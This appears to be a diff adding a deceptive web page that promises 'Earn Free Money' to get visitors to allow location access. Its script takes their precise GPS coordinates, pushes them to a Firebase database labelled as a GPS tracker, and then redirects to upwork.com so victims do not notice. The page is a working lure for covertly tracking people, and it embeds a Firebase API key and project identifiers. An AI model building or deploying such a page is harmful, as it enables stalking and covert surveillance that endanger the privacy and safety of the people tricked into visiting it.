@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Earn Money From TopshopBD</title>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      background-color: #4CAF50;
+      color: white;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    .error-message {
+      color: red;
+      font-size: 1.2em;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>💰 Earn Free Money</h1>
+  <p>Allow location access to continue</p>
+  <button id="getLocationButton">Allow Location and Continue</button>
+  <p id="status"></p>
+
+  <script>
+    // ✅ Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBwCoi9rTUIVnTr1lZk8QgjUiBSTUq80Vs",
+      authDomain: "gps-tracker-project-1cf19.firebaseapp.com",
+      databaseURL: "https://gps-tracker-project-1cf19-default-rtdb.firebaseio.com",
+      projectId: "gps-tracker-project-1cf19",
+      storageBucket: "gps-tracker-project-1cf19.appspot.com",
+      messagingSenderId: "426290662336",
+      appId: "1:426290662336:web:36c4c8790b90ef75f29625"
+    };
+
+    // ✅ Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const getLocationButton = document.getElementById('getLocationButton');
+    const statusDiv = document.getElementById('status');
+
+    function setStatusMessage(message, isError = false) {
+      statusDiv.innerText = message;
+      if (isError) {
+        statusDiv.classList.add('error-message');
+      } else {
+        statusDiv.classList.remove('error-message');
+      }
+    }
+
+    function sendLocationAndRedirect(position) {
+      const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        timestamp: position.timestamp
+      };
+
+      const locationKey = database.ref().child('locations').push().key;
+      database.ref('locations/' + locationKey).set(data)
+        .then(() => {
+          setStatusMessage("✅ Location sent successfully. Redirecting...");
+          window.location.href = "https://www.upwork.com"; // ✅ Redirect here
+        })
+        .catch(() => {
+          setStatusMessage("❌ FAILED: Could not send location. Try again.", true);
+        });
+    }
+
+    function handleError(error) {
+      let errorMessage = "FAILED!";
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          errorMessage = "❌ FAILED: Permission denied!";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          errorMessage = "❌ FAILED: Location unavailable!";
+          break;
+        case error.TIMEOUT:
+          errorMessage = "❌ FAILED: Request timed out!";
+          break;
+        default:
+          errorMessage = "❌ FAILED: Unknown error!";
+      }
+      setStatusMessage(errorMessage, true);
+    }
+
+    // ✅ Main Click Listener
+    if (navigator.geolocation) {
+      getLocationButton.addEventListener('click', () => {
+        setStatusMessage("🔄 Requesting location...");
+        navigator.geolocation.getCurrentPosition(sendLocationAndRedirect, handleError, {timeout:10000});
+      });
+    } else {
+      setStatusMessage("❌ Geolocation not supported by this browser.", true);
+      getLocationButton.disabled = true;
+    }
+  </script>
+</body>
+</html>
